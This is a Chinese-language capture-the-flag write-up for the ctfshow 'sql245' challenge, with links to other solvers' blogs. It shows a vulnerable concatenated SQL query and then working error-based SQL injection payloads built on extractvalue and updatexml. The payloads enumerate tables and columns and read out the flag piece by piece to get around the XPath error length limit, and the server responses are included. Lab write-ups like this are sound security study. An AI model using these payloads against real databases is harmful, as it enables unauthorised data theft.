# ctfshow-sql245



##### 参考链接

其他大佬链接

feng  https://blog.csdn.net/rfrder/article/details/113759746

Je3    https://blog.csdn.net/jvkyvly/article/details/115458909

Y4	 https://blog.csdn.net/solitudi/article/details/110144623





 查询语句 

```
 //备份表
  $sql = "select id,username,pass from ctfshow_user where id = '".$id."' limit 1;";

```



 返回逻辑 

```
  //无过滤
  过滤updatexml
```





```mysql
过滤updatexml,还有extractvalue
两者区别
http://localhost/sqli.php?name=' or extractvalue(1,concat(user(),0x7e,version())) # &pass=1

http://localhost/index.php?name=' or updatexml(1,concat(user(),0x7e,version()),1) # &pass=1

/api
get传参


?id=' or extractvalue(1,concat(0x7e,database(),0x7e))-- -
~ctfshow_web~


因为xpath的报错只有32位，所以需要截取

?id=' or extractvalue(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),1))-- -


{"code":0,"msg":"XPATH syntax error: 'banlist,ctfshow_flagsa,ctfshow_u'","count":1,"data":[]}
少了应该是ctfshow_user
banlist,ctfshow_flagsa,ctfshow_user


?id=' or extractvalue(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagsa'),1))-- -

{"code":0,"msg":"XPATH syntax error: 'id,flag1,info1'","count":1,"data":[]}



?id=' or extractvalue(1,concat(1,substr((select group_concat(flag1) from ctfshow_flagsa),1,32),1))-- -

{"code":0,"msg":"XPATH syntax error: 'ctfshow{9d25c68a-6712-4cad-96d3-'","count":1,"data":[]}
ctfshow{9d25c68a-6712-4cad-96d3-

?id=' or extractvalue(1,concat(1,substr((select group_concat(flag1) from ctfshow_flagsa),20,32),1))-- -
{"code":0,"msg":"XPATH syntax error: 'cad-96d3-1e1819039ad5}1'","count":1,"data":[]}


ctfshow{9d25c68a-6712-4cad-96d3-1e1819039ad5}
```























